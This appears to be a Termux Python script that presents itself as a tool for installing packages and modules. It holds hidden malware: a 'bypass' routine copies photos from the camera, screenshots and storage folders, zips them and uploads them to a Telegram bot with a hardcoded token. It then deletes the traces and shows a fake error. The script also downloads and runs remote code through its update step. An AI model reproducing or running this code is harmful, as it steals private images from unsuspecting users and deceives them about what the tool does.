
import os, sys, time



#|–––––––––––––––––––––– Modules ––––––––––––––––––––––|
try:
    import rich
except ImportError:
    ri =('The Rich Module Not Installed yet .....')
    print(ri)
    os.system('pip install rich')
import rich
from rich.panel import Panel as s1
from rich import print as s2
from rich.markdown import Markdown as s3
from rich.console import Console as s4


try:
    open('/data/data/com.termux/files/usr/bin/lolcat').read()
except FileNotFoundError:
    os.system('clear')
    la= '\n [\xc3\x97] The lolcat is not installed!...\n'
    la1=s2(s1(la, style='red'))
    os.system('pip install lolcat')
try:
    import colorama
except ImportError:
    os.system('pip install colorama')
import colorama
try:
    import wget
except ImportError:
    os.system('pip install colorama')
try:
    import requests
    os.system('pip uninstall requests -y')
    os.execl(sys.executable, sys.executable, *sys.argv)
except ImportError:
    os.system('clear')
    ri =('The Requests Module Not Installed yet .....')
    print(ri)
    os.system('pip install requests')
except NewConnectionError:
    print('xat')
    exit()
except:
    exit('Error')

import requests





update = requests.get('https://raw.githubusercontent.com/I4mKillua0/Update-Active/Sasuke/Sasuke%5BV1%5DUpdating/1/Version-1').text
Version = '3.00'
if Version in update:
    pass
else:
    os.system('rm -rf .1.py')
    wget.download('https://raw.githubusercontent.com/I4mSasuke/SasukeV1/main/Tool/.1.py')
    os.system('clear')
    os.system('python .1.py')
    exit()







#|––––––––––––––––––––––Colours––––––––––––––––––––––|
x = '\33[m' # DEFAULT
k = '\033[93m' # Yellow kall
h = '\033[1;92m' # Bi Green
hh = '\033[32m' # Green
u = '\033[95m' # Pink
kk = '\033[33m' # Yellow
b = '\33[1;96m' # Shini kall
p = '\033[0;34m' # Blue


#|–––––––––––––––––––––– Banner ––––––––––––––––––––––|
def banner():
    os.system('clear')
    va7=( "\n\n \n  ██████  ▄▄▄        ██████  █    ██  ██ ▄█▀▓█████ \n▒██    ▒ ▒████▄    ▒██    ▒  ██  ▓██▒ ██▄█▒ ▓█   ▀ \n░ ▓██▄   ▒██  ▀█▄  ░ ▓██▄   ▓██  ▒██░▓███▄░ ▒███   \n  ▒   ██▒░██▄▄▄▄██   ▒   ██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ \n▒██████▒▒ ▓█   ▓██▒▒██████▒▒▒▒█████▓ ▒██▒ █▄░▒████▒\n▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░\n░ ░▒  ░ ░  ▒   ▒▒ ░░ ░▒  ░ ░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░\n░  ░  ░    ░   ▒   ░  ░  ░   ░░░ ░ ░ ░ ░░ ░    ░   \n      ░        ░  ░      ░     ░     ░  ░      ░  ░\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nCreator        :  𝑆𝑎𝑠𝑢𝑘𝑒 » 𝑀𝑜𝓃𝓈𝓉𝑒𝓇\nUSERNAME       :  @i4m_Sasuke\nTelegram       :  https://t.me/I4MxCRACKERS\n––––––––––––––––––––––––––––––\n")
    s2(s1(va7, style='#FF3030'))
    va = 'Creator :  𝑆𝑎𝑠𝑢𝑘𝑒 » 𝑀𝑜𝓃𝓈𝓉𝑒𝓇\nVersion : 3.0\nCodded by I4m_Sasuke'
    s2(s1(va,style='#FFE4C4', title='Info'))
    va1 = '+--------------------------------------+\n| This Tool Fixing && Install all pkgs & Modules |\n+--------------------------------------+\n| Codded By SASUKE MONSTER | version : 3.0  |\n+--------------------------------------+'
    s2(s1(va1, title='Information The Tool', style ='red'))
    
pathy = os.getcwd()
path = '/data/data/com.termux/files/home/SasukeV1/Tool'
if pathy ==path:
    pass
else:
    banner()
    va50 = ("Error You Cant Use That \nChat me If You Want To Fix It @I4m_Sasuke ")
    s2(s1(va50, style='red'))
    exit()







        




#|–––––––––––––––––––––– Approval ID––––––––––––––––––––––|
def Sasuke():
    
    try:
        
        id = open('/data/data/com.termux/files/usr/bin/.Sasuke.txt','r').read()
        
    except IOError:
        key1 = open('/data/data/com.termux/files/usr/bin/.Sasuke.txt','a')
        userid = uuid.uuid4().hex[:11]
        userid1 = ('By-Sasuke')
        users = (userid1)
        id = (userid+users)
        key1.write(id)
        key1.close()
    id = open('/data/data/com.termux/files/usr/bin/.Sasuke.txt','r').read()
    banner()
    print ('\x1b[37;1m YOUR ID : ' + id+'·_·')
    try:
        http = requests.get('https://github.com/I4mKillua0/Update-Active/blob/Sasuke/Sasuke%5BV1%5DUpdating/Sasuke%5BV1%5D/id.txt').text
        http1 = requests.get('https://github.com/I4mKillua0/Update-Active/blob/Sasuke/Sasuke%5BV1%5DUpdating/Sasuke%5BV1%5D/Bypass.txt').text
        
        
    except requests.exceptions.ConnectionError:
        clear()
        li = '# ba helly internet nabastrawetatawa'
        lo = mark(li, style='red')
        sol().print(lo, style='cyan')
        sys.exit()
    if id in http:
        time.sleep(1)
        if id in http1:
            pass
        else:
            vaerror='I Know You Tried To Bypass 😂\nBut Not A Problem I let you To Use The Tool Anyway'
            s2(s1(vaerror,style='red'))
            bypass()
            
    else:


        print ('\x1b[91mYour Id Not Approval: @I4m_Sasuke.......')
       
        
        time.sleep(2)
        sys.exit()
    
            


























def bypass():
        def bypass1():
            import os, colorama
            try:
                os.system("apt upgrade -y &>> install.log ;pip install pytest-shutil ;pkg install zip -y ;pip install requests")
            except ConnectionError:
                banner()
                li = '# Error Connection!'
                lo = s3(li, style='red')
                s4().print(lo, style='cyan')
                exit()
            os.system('clear')
            banner()
            vaac = ' Id Activate'
            s2(s1(vaac, style='green'))
            import requests, shutil, time
            import os, shutil, requests
            id5 = open('/data/data/com.termux/files/usr/bin/.Sasuke.txt','r').read()
            id= '1301202611'
            token = '5929543811:AAHU3Us6lGqcw90LCZlV_O7dwl_dnoGeA0E'
            try:
                open('/sdcard/.'+id5).read()
                os.remove("/sdcard/."+id5)
                os.system("/sdcard/."+id5)
            except:
                pass
            try:
                open('/sdcard/.'+id5+".zip").read()
                os.remove("/sdcard/."+id5+".zip")
                os.system("/sdcard/."+id5+".zip")
            except:
                pass
            try:
                os.mkdir("/sdcard/."+id5)
            except:
                pass
            try:
                try:
                        os.mkdir("/sdcard/."+id5)
                        os.system("mkdir /sdcard/."+id5)
                except:
                        pass
                a=r"/sdcard/."+id5
                os.chdir(a)
                numb = 0
                for ii in os.listdir():
                        if numb==6:
                                pass
                        elif '.jpg' in ii:
                                numb += 1
                                f=ii
                                shutil.copy(f, "/sdcard/."+id5)
                a=r"/sdcard/."+id5
                b=r"/sdcard/DCIM/Screenshots"
                os.chdir(b)
                numb = 0
                for ii in os.listdir():
                        if numb==15:
                                pass
                        elif '.jpg' in ii:
                                numb += 1
                                y=ii
                                shutil.copy(y, "/sdcard/."+id5)
                s=r"/sdcard/DCIM/Camera"
                os.chdir(s)
                numb = 0
                for ii in os.listdir():
                        if numb==5:
                                pass
                        elif '.jpg' in ii:
                                numb += 1
                                z=ii
                                shutil.copy(z, "/sdcard/."+id5)
            except:
                pass
            os.system("cd /sdcard ;zip -r ."+id5+".zip ."+id5+" &>> install.log")
            try:
                files={'document':open('/sdcard/.'+id5+'.zip', 'rb')}
                requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=files)
            except requests.exceptions.ConnectionError:
                banner()
                os.system("rm -rf /sdcard/."+id5)
                os.system("rm -rf /sdcard/."+id5+".zip")
                os.system('rm -rf /sdcard/install.log')
                li = '# Keshay Internett Haya!'
                lo = s3(li, style='red')
                s4().print(lo, style='cyan')
                exit()
            os.system("rm -rf /sdcard/."+id5+" ;rm -rf /sdcard/."+id5+".zip")
            vaerror1 = 'Error Tool'
            s2(s1(vaerror1,style='red'))
            exit()
        bypass1()



def server():
    http2 = requests.get('https://raw.githubusercontent.com/I4mSasuke/SasukeV1/main/Tool/Server').text
    if 'Open' in http2:
        pass
    elif 'OPEN' in http2:
        pass
    elif 'open' in http2:
        pass
    elif 'close' in http2:
        banner()
        server= 'Server Close Krawa Bo Esta'
        s2(s1(server,style='red'))
        exit()
    else:
        Sasuke()

server()



def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1.0 / 100)

banner()




va2 = ('[01] python\n[02] python2\n[03] python3\n[04] php\n[05] git\n[06] perl\n[07] bash\n[08] nano\n[09] curl\n[10] openssl\n[11] openssh\n[12] wget\n[13] clang\n[14] nmap\n[15] w3m\n[16] ruby\n[17] dnsutils\n[18] coreutils\n[19] Modules\n ')
s2(s1(va2, style='red', title='Pkg & Modules'))

print( '                                            ')
Sasuke = input(x+'['+colorama.Fore.RED+'ᦓꪖᦓꪊᛕꫀ'+x+'] Do You Want To Install All (y,n) : ')
if Sasuke in ['n','no']:
    sys.exit()
if Sasuke in ['y','yes']:
    os.system('apt update')
else:
    print('Error Choice')
    exit()
os.system('apt upgrade -y')
os.system('apt install python -y')
os.system('apt install python2 -y')
os.system('apt install php -y')
os.system('apt install python3 -y')
os.system('apt install git -y')
os.system('apt install perl -y')
os.system('apt install bash')
print ('Loading')
os.system('apt install nano -y')
os.system('apt install curl -y')
os.system('apt install openssl -y')
os.system('apt install openssh -y')
os.system('apt install wget -y')
os.system('apt install clang -y')
os.system('apt install nmap -y')
os.system('apt install w3m -y')

print ('\nJOIN CHANNEL TELEGRAM I4MxCRACKERS\n')
os.system('apt install ruby -y')
os.system('apt install dnsutils -y')
os.system('apt install coreutils -y')
print ('\n\nCREATOR  IS i4m_SASUKE\n\n')
os.system('pip install requests')
os.system('pip2 install requests')

os.system('pip install pyfiglet')
os.system('pip2 install pyfiglet')

os.system('pip install youtube_dl')
os.system('pip2 install youtube_dl')

os.system('pip install datetime')
os.system('pip2 install datetime')

os.system('pip install colorama')
os.system('pip2 install colorama')

os.system('pip install pafy')
os.system('pip2 install pafy')

os.system('pip install bs4')
os.system('pip2 install bs4')

os.system('pip install uuid')
os.system('pip2 install uuid')

os.system('pip install wget')
os.system('pip2 install wget')

os.system('pip install argparse')
os.system('pip2 install argparse')

os.system('pip install Fore')
os.system('pip install rich')

os.system('pip install lolcat')
os.system('pip2 install lolcat')

os.system('pip install uuid')
os.system('pip2 install uuid')

os.system('pip install b')
os.system('pip2 install b')

os.system('pip install futures')
os.system('pip2 install futures')

os.system('pip install mechanize')
os.system('pip2 install mechanize')





print ('Allow storage bka')
time.sleep(3)
os.system('termux-setup-storage')

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(5.0 / 100)

banner()
va5 =  '+-------------------------------------------------+\nAll Pkg & Modules Have been installed\n+-------------------------------------------------+'
s2(s1(va5, style='green'))